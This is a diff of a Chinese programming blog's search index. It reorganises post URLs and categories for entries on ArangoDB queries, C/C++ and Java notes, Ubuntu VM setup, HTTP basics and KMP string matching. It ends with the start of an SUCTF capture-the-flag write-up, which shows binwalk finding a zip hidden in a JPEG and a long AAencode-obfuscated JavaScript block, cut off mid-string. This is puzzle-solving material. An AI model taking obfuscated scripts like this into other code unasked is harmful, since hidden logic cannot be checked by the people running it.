@@ -2,7 +2,7 @@
 <search>
   <entry>
     <title>ArangoDB入门</title>
-    <url>/application/ArangoDB%E5%85%A5%E9%97%A8.html</url>
+    <url>/ArangoDB%E5%85%A5%E9%97%A8.html</url>
     <content><![CDATA[<p>[toc]</p>
 <h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>毕业设计选到一个知识图谱相关的课题。</p>
 <p>而知识图谱中的一个关键问题就是：数据存储方式。</p>
@@ -112,11 +112,11 @@
 <ul>
 <li>查询某个 Document：</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RETURN DOCUMENT(&quot;users/9883&quot;)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RETURN DOCUMENT(&quot;users&#x2F;9883&quot;)</span><br></pre></td></tr></table></figure>
 <ul>
 <li>查询多个 Document：</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RETURN DOCUMENT( [&quot;users/9883&quot;, &quot;users/9915&quot;, &quot;users/10074&quot;] )</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RETURN DOCUMENT( [&quot;users&#x2F;9883&quot;, &quot;users&#x2F;9915&quot;, &quot;users&#x2F;10074&quot;] )</span><br></pre></td></tr></table></figure>
 <ul>
 <li>查询 Collection 中所有数据：</li>
 </ul>
@@ -145,13 +145,13 @@
 <ul>
 <li>多 Collection 联合查询并返回 json 列表：</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FOR user1 IN users</span><br><span class="line">  FOR user2 IN users</span><br><span class="line">    FILTER user1 != user2</span><br><span class="line">    RETURN [user1.name, user2.name]</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FOR user1 IN users</span><br><span class="line">  FOR user2 IN users</span><br><span class="line">    FILTER user1 !&#x3D; user2</span><br><span class="line">    RETURN [user1.name, user2.name]</span><br></pre></td></tr></table></figure>
 <p>返回示例：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">  [ &quot;James Hendrix&quot;, &quot;John Smith&quot; ],</span><br><span class="line">  [ &quot;James Hendrix&quot;, &quot;Katie Foster&quot; ],</span><br><span class="line">  [ &quot;John Smith&quot;, &quot;James Hendrix&quot; ],</span><br><span class="line">  [ &quot;John Smith&quot;, &quot;Katie Foster&quot; ],</span><br><span class="line">  [ &quot;Katie Foster&quot;, &quot;James Hendrix&quot; ],</span><br><span class="line">  [ &quot;Katie Foster&quot;, &quot;John Smith&quot; ]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
 <ul>
 <li>复杂查询：</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FOR user1 IN users</span><br><span class="line">  FOR user2 IN users</span><br><span class="line">    FILTER user1 != user2</span><br><span class="line">    LET sumOfAges = user1.age + user2.age</span><br><span class="line">    FILTER sumOfAges &lt; 100</span><br><span class="line">    RETURN &#123;</span><br><span class="line">        pair: [user1.name, user2.name],</span><br><span class="line">        sumOfAges: sumOfAges</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FOR user1 IN users</span><br><span class="line">  FOR user2 IN users</span><br><span class="line">    FILTER user1 !&#x3D; user2</span><br><span class="line">    LET sumOfAges &#x3D; user1.age + user2.age</span><br><span class="line">    FILTER sumOfAges &lt; 100</span><br><span class="line">    RETURN &#123;</span><br><span class="line">        pair: [user1.name, user2.name],</span><br><span class="line">        sumOfAges: sumOfAges</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 <ul>
 <li>更新 Document 中的某些属性（不存在则创建），不影响其它属性：</li>
 </ul>
@@ -172,11 +172,11 @@
 <li>删除指定 Document：</li>
 </ul>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">REMOVE &quot;9883&quot; IN users</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FOR user IN users</span><br><span class="line">    FILTER user.age &gt;= 30</span><br><span class="line">    REMOVE user IN users</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FOR user IN users</span><br><span class="line">    FILTER user.age &gt;&#x3D; 30</span><br><span class="line">    REMOVE user IN users</span><br></pre></td></tr></table></figure>
 <h2 id="4-ArangoDB-图概念"><a href="#4-ArangoDB-图概念" class="headerlink" title="4. ArangoDB 图概念"></a>4. ArangoDB 图概念</h2><p>在 ArangoDB 的图模式中，结点（实体）用 <code>Document</code> 存储，边（关系）用 <code>Edge</code> 存储。</p>
 <p>Edge 是一种特殊的 Document，也存储在 Collection 集合中，几乎相当于 Document。区别是，Edge 除了默认的 <code>_id</code>、<code>_key</code> 属性，还有默认的 <code>_from</code>、<code>_to</code> 属性，分别指向边所连结点的 <code>_id</code>。</p>
 <p>对 Edge 的增删改查操作与对 Document 操作几乎相同，区别是 <code>_from</code>、<code>_to</code> 属性不能为空。比如，插入边时必须要指定 <code>_from</code>、<code>_to</code> 属性值：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INSERT &#123;_from: &quot;papers/38153&quot;, _to: &quot;authors/37290&quot; &#125; INTO write_by</span><br><span class="line">RETURN NEW</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INSERT &#123;_from: &quot;papers&#x2F;38153&quot;, _to: &quot;authors&#x2F;37290&quot; &#125; INTO write_by</span><br><span class="line">RETURN NEW</span><br></pre></td></tr></table></figure>
 <p>对比关系数据库：</p>
 <ul>
 <li><p>在关系数据库中，实体间关系通过外键以及中间表的形式表示，关系查询则通过表连接的形式表示；</p>
@@ -217,33 +217,34 @@
 <ul>
 <li>查询所有从 <code>LAX</code> 机场出发，深度为1，经过 <code>flights</code> 边到达的机场的名字：</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FOR airport IN 1..1 OUTBOUND &apos;airports/LAX&apos; flights</span><br><span class="line">  RETURN DISTINCT airport.name</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FOR airport IN 1..1 OUTBOUND &#39;airports&#x2F;LAX&#39; flights</span><br><span class="line">  RETURN DISTINCT airport.name</span><br></pre></td></tr></table></figure>
 <ul>
 <li>查询10个从 <code>LAX</code> 机场出发，深度为1，经过 <code>flights</code> 边最终到达的机场和经过的边：</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FOR airport, flight IN OUTBOUND &apos;airports/LAX&apos; flights</span><br><span class="line">  LIMIT 10</span><br><span class="line">  RETURN &#123;airport, flight&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FOR airport, flight IN OUTBOUND &#39;airports&#x2F;LAX&#39; flights</span><br><span class="line">  LIMIT 10</span><br><span class="line">  RETURN &#123;airport, flight&#125;</span><br></pre></td></tr></table></figure>
 <ul>
 <li>查询10个到达 <code>BIS</code> 机场，深度为1，<code>flights</code> 集合的边：</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FOR airport, flight IN INBOUND &apos;airports/BIS&apos; flights</span><br><span class="line">  LIMIT 10</span><br><span class="line">  RETURN flight</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FOR airport, flight IN INBOUND &#39;airports&#x2F;BIS&#39; flights</span><br><span class="line">  LIMIT 10</span><br><span class="line">  RETURN flight</span><br></pre></td></tr></table></figure>
 <p>返回的可视化结果如下：</p>
 <p><img src="ArangoDB入门/9.png" alt="1"></p>
 <ul>
 <li>查询所有1月5至1月7号间，从 <code>BIS</code> 机场出发或到达 <code>BIS</code> 机场，深度为1的机场城市及航班时间：</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FOR airport, flight IN ANY &apos;airports/BIS&apos; flights</span><br><span class="line">  FILTER flight.Month == 1</span><br><span class="line">    AND flight.Day &gt;= 5</span><br><span class="line">    AND flight.Day &lt;= 7</span><br><span class="line">  RETURN &#123; city: airport.city, time: flight.ArrTimeUTC &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FOR airport, flight IN ANY &#39;airports&#x2F;BIS&#39; flights</span><br><span class="line">  FILTER flight.Month &#x3D;&#x3D; 1</span><br><span class="line">    AND flight.Day &gt;&#x3D; 5</span><br><span class="line">    AND flight.Day &lt;&#x3D; 7</span><br><span class="line">  RETURN &#123; city: airport.city, time: flight.ArrTimeUTC &#125;</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
-        <category>应用与开发</category>
+        <category>九层之台，起于累土</category>
+        <category>数据库</category>
       </categories>
       <tags>
-        <tag>Backend</tag>
         <tag>数据库</tag>
+        <tag>ArangoDB</tag>
       </tags>
   </entry>
   <entry>
     <title>C/C++重难点</title>
-    <url>/language/C-C-%E9%87%8D%E9%9A%BE%E7%82%B9.html</url>
+    <url>/C-C-%E9%87%8D%E9%9A%BE%E7%82%B9.html</url>
     <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>实习生面试写代码的时候，由于C、C++混用，出现了不可抗拒的BUG，最终调试失败，面试凉凉。</p>
 <p>事后，深感自己C++学得不扎实，又患有C与C++混用的毛病。因此，特开新篇，归纳自己在使用C++过程中，所遇到的重难点。</p>
 <a id="more"></a>
@@ -350,7 +351,8 @@
 </ul>
 ]]></content>
       <categories>
-        <category>程序设计基础</category>
+        <category>九层之台，起于累土</category>
+        <category>程序设计语言</category>
       </categories>
       <tags>
         <tag>C/C++</tag>
@@ -358,7 +360,7 @@
   </entry>
   <entry>
     <title>C++重载与覆盖</title>
-    <url>/language/C-%E9%87%8D%E8%BD%BD%E4%B8%8E%E8%A6%86%E7%9B%96.html</url>
+    <url>/C-%E9%87%8D%E8%BD%BD%E4%B8%8E%E8%A6%86%E7%9B%96.html</url>
     <content><![CDATA[<h2 id="重载与覆盖相同点"><a href="#重载与覆盖相同点" class="headerlink" title="重载与覆盖相同点"></a>重载与覆盖相同点</h2><p>都是函数之间的一种关系。不同点如下：</p>
 <a id="more"></a>
 <h2 id="重载（overload"><a href="#重载（overload" class="headerlink" title="重载（overload)"></a>重载（overload)</h2><p>1.函数名称相同，但是参数的个数或类型不全相同，即为重载。</p>
@@ -373,7 +375,8 @@
 <p>覆盖也称<strong>重写</strong>。</p>
 ]]></content>
       <categories>
-        <category>程序设计基础</category>
+        <category>九层之台，起于累土</category>
+        <category>程序设计语言</category>
       </categories>
       <tags>
         <tag>C/C++</tag>
@@ -381,7 +384,7 @@
   </entry>
   <entry>
     <title>VM 虚拟机安装及配置 Ubuntu18</title>
-    <url>/application/VM%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85Ubuntu%E5%8F%8A%E8%BF%9B%E8%A1%8C%E7%9B%B8%E5%85%B3%E9%85%8D%E7%BD%AE.html</url>
+    <url>/VM%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85Ubuntu%E5%8F%8A%E8%BF%9B%E8%A1%8C%E7%9B%B8%E5%85%B3%E9%85%8D%E7%BD%AE.html</url>
     <content><![CDATA[<p>[TOC]</p>
 <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近总是将虚拟机Ubuntu进行卸载、重装、卸载、重装。。。。</p>
 <p>每次重装后，都要上网查找Ubuntu各种环境、工具的配置方案。实在太过繁琐，于是便打算自己进行总结一番，以便后用。</p>
@@ -443,15 +446,15 @@
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
-        <category>应用与开发</category>
+        <category>不知道怎么分类的分类</category>
       </categories>
       <tags>
-        <tag>计算机系统</tag>
+        <tag>虚拟机</tag>
       </tags>
   </entry>
   <entry>
     <title>JavaWeb学习之入门</title>
-    <url>/application/JavaWeb%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%85%A5%E9%97%A8.html</url>
+    <url>/JavaWeb%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%85%A5%E9%97%A8.html</url>
     <content><![CDATA[<h3 id="前言（后加）"><a href="#前言（后加）" class="headerlink" title="前言（后加）"></a>前言（后加）</h3><p>本文是笔者最初入门web时，所写的笔记。时隔多日，打算将此放上博客。虽然，现在看来，其中内容十分简单，但也算笔者曾经的天真。</p>
 <p>注：本文内容大多是阅读<a href="http://www.cnblogs.com/xdp-gacl/tag/JavaWeb%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/default.html?page=3" target="_blank" rel="noopener">一位大神博客</a>所总结的。</p>
 <a id="more"></a>
@@ -476,7 +479,7 @@
 <li>Connection：浏览器通过这个头告诉服务器，请求完后是断开链接还是何持链接</li>
 </ul>
 <h4 id="2Http响应消息"><a href="#2Http响应消息" class="headerlink" title="2Http响应消息"></a>2Http响应消息</h4><p>2.1一个HTTP响应代表服务器向客户端回送的数据，它包括： 一个状态行、若干消息头、以及实体内容 。</p>
-<p>2.2状态行格式： HTTP版本号　状态码　原因叙述<crlf><br>举例：HTTP/1.1 200 OK</crlf></p>
+<p>2.2状态行格式： HTTP版本号　状态码　原因叙述<CRLF><br>举例：HTTP/1.1 200 OK</p>
 <p>2.3HTTP响应中的常用响应头(消息头):</p>
 <ul>
 <li>Location: 服务器通过这个头，来告诉浏览器跳到哪里</li>
@@ -500,16 +503,17 @@
 <h3 id="六、Servlet"><a href="#六、Servlet" class="headerlink" title="六、Servlet"></a>六、Servlet</h3><p>一种用于开发动态web的技术：<img src="JavaWeb学习之入门/JavaWeb1.png" alt="JavaWeb1"></p>
 ]]></content>
       <categories>
-        <category>应用与开发</category>
+        <category>不想开滴滴的外卖骑手不是好码农</category>
+        <category>后端</category>
       </categories>
       <tags>
-        <tag>Backend</tag>
         <tag>Java</tag>
+        <tag>后端</tag>
       </tags>
   </entry>
   <entry>
     <title>Java重难点</title>
-    <url>/language/Java%E9%87%8D%E9%9A%BE%E7%82%B9.html</url>
+    <url>/Java%E9%87%8D%E9%9A%BE%E7%82%B9.html</url>
     <content><![CDATA[<h2 id="1-静态方法与实例方法的区别"><a href="#1-静态方法与实例方法的区别" class="headerlink" title="1. 静态方法与实例方法的区别"></a>1. 静态方法与实例方法的区别</h2><p>实例方法，对象的成员函数，必须<strong>实例化对象</strong>之后(<code>new Object()</code>)，才能通过<strong>实例对象</strong>调用该对象的实例方法。</p>
 <p>静态方法，使用<code>static</code>关键字声明，如<code>main</code>函数：</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br></pre></td></tr></table></figure>
@@ -534,7 +538,8 @@
 <p><code>java</code>中拷贝对象时，应根据适当场景使用对应拷贝方式。</p>
 <h2 id="3-内部类"><a href="#3-内部类" class="headerlink" title="3. 内部类"></a>3. 内部类</h2>]]></content>
       <categories>
-        <category>程序设计基础</category>
+        <category>九层之台，起于累土</category>
+        <category>程序设计语言</category>
       </categories>
       <tags>
         <tag>Java</tag>
@@ -542,7 +547,7 @@
   </entry>
   <entry>
     <title>KMP模式匹配算法</title>
-    <url>/cs/KMP%E6%A8%A1%E5%BC%8F%E5%8C%B9%E9%85%8D.html</url>
+    <url>/KMP%E6%A8%A1%E5%BC%8F%E5%8C%B9%E9%85%8D.html</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>KMP是一种模式匹配算法，什么是模式匹配呢？就是，现有一个<strong>模式串</strong>（字符串），要在另一个主串中查找是否存在与模式串相等的子串（主串中任意连续字符组成的子序列）。</p>
 <p>该算法的用处广泛，是正则表达式的基础。</p>
 <p>例如，有一个字符串为”ababcabcacbab”，我们想知道该字符串中有没有一个”abcac”的字符串，这就叫模式匹配。</p>
@@ -573,20 +578,21 @@
 <h3 id="详细代码"><a href="#详细代码" class="headerlink" title="详细代码"></a>详细代码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取模式串的next数组函数：</span></span><br><span class="line"><span class="comment">// 将模式串既当作“主串”又当作模式串，同样按照KMP的算法进行匹配求next值。</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getNext</span><span class="params">(<span class="keyword">char</span> *str,<span class="keyword">int</span> *next,<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    next[<span class="number">0</span>]=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> j=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">while</span> (i&lt;n) &#123;</span><br><span class="line">        <span class="comment">// 如果j==-1，则“主串”i位置的next值为0。</span></span><br><span class="line">        <span class="comment">// 前进到“主串”的下一位，并使模式串从头开始匹配</span></span><br><span class="line">        <span class="keyword">if</span> (j == <span class="number">-1</span>) &#123;</span><br><span class="line">            next[i]=<span class="number">0</span>;</span><br><span class="line">            i++;</span><br><span class="line">            j=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果“主串”i位置的前一位和模式串j位置相同，则“主串”i位置的next值为j+1。</span></span><br><span class="line">        <span class="comment">// 同时“主串”与模式串继续向下匹配。</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (str[i<span class="number">-1</span>] == str[j]) &#123;</span><br><span class="line">            next[i]=j+<span class="number">1</span>;</span><br><span class="line">            i++;</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果不匹配，则前进到模式串的next[j]位置</span></span><br><span class="line">        <span class="keyword">else</span> j=next[j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">10000</span>],pat[<span class="number">10000</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"please push the main string:\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>,str);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"please push the pattern:\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>,pat);</span><br><span class="line">    <span class="keyword">int</span> lenS=<span class="built_in">strlen</span>(str),lenP=<span class="built_in">strlen</span>(pat);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// next数组：当模式串第j位与主串当前第i位不匹配时，将模式串向后滑动，</span></span><br><span class="line">    <span class="comment">//          用模式串中第next[j]位再与主串中的第i位比较。</span></span><br><span class="line">    <span class="comment">//          若next[j]==-1，则将模式串整体向后移动一位，与主串中第i+1位继续比较。</span></span><br><span class="line">    <span class="keyword">int</span> *next=(<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*lenP);</span><br><span class="line">    getNext(pat, next, lenP);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;    <span class="comment">// i为主串中字符位置，j为模式串中字符位置</span></span><br><span class="line">    <span class="keyword">while</span> (i&lt;lenS) &#123;</span><br><span class="line">        <span class="comment">// 如果j==-1，则模式串整体向后移动一位，与主串中第i+1位比较</span></span><br><span class="line">        <span class="keyword">if</span> (j == <span class="number">-1</span>) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            j=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果主串i位置与模式串j位置相等，则i、j都向下继续配对</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (str[i] == pat[j]) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            j++;</span><br><span class="line">            <span class="keyword">if</span> (j == lenP) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"find pattern in %d\n"</span>, i-lenP);</span><br><span class="line">                j=<span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果模式串j位置与主串i位置不匹配，则将模式串向后滑动，</span></span><br><span class="line">        <span class="comment">// 用模式串的next[j]位置与主串i位置匹配</span></span><br><span class="line">        <span class="keyword">else</span> j=next[j];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(next);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
-        <category>计算机基础</category>
+        <category>九层之台，起于累土</category>
+        <category>数据结构与算法</category>
       </categories>
       <tags>
-        <tag>算法</tag>
+        <tag>数据结构与算法</tag>
       </tags>
   </entry>
   <entry>
     <title>SUCTF线上赛writeup ---- by douNine</title>
-    <url>/cs/SUCTF-writeup-douNine.html</url>
+    <url>/SUCTF-writeup-douNine.html</url>
     <content><![CDATA[<h3 id="一、misc"><a href="#一、misc" class="headerlink" title="一、misc"></a>一、misc</h3><h4 id="1-single-dog"><a href="#1-single-dog" class="headerlink" title="1.single dog:"></a>1.single dog:</h4><a id="more"></a>
 <p>下载后，启用虚拟机的共享文件夹，然后在虚拟机Ubuntu下，用binwalk查看该文件夹中lalalala.jpg：</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dou9@ubuntu:/mnt/hgfs/SUCTF/misc/single-dog$ binwalk lalalala.jpg</span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             JPEG image data, JFIF standard 1.01</span><br><span class="line">30            0x1E            TIFF image data, big-endian, offset of first image directory: 8</span><br><span class="line">18142         0x46DE          Unix path: /www.w3.org/1999/02/22-rdf-syntax-ns#"&gt;&lt;rdf:Description rdf:about="uuid:faf5bdd5-ba3d-11da-ad31-d33d75182f1b" xmlns:xmp="http://</span><br><span class="line">115772        0x1C43C         Zip archive data, at least v2.0 to extract, compressed size: 729, uncompressed size: 8206, name: 1.txt</span><br><span class="line">116623        0x1C78F         End of Zip archive</span><br></pre></td></tr></table></figure>
 <p>发现该jpg文件中藏着一个压缩包，压缩包中有一个txt文件。接下来，直接用<code>binwalk -e lalalala.jpg</code>拆分该文件。最终，生成一个了压缩包，在该压缩包中有一个1.txt文件，查看该文件后发现里面是一堆有规律的字符：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ [&apos;_&apos;]; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: &apos;_&apos; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &apos;_&apos;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +&apos;_&apos;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +&apos;_&apos;) [c^_^o];(ﾟДﾟ) [&apos;c&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&apos;o&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [&apos;c&apos;]+(ﾟДﾟ) [&apos;o&apos;]+(ﾟωﾟﾉ +&apos;_&apos;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟｰﾟ] + ((ﾟДﾟ) +&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&apos;c&apos;]+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&apos;o&apos;]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ];(ﾟДﾟ) [&apos;_&apos;] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +&apos;_&apos;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&apos;_&apos;) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&apos;\\&apos;; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +&apos;_&apos;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=&apos;\&quot;&apos;;(ﾟДﾟ) [&apos;_&apos;] ( (ﾟДﾟ) [&apos;_&apos;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ 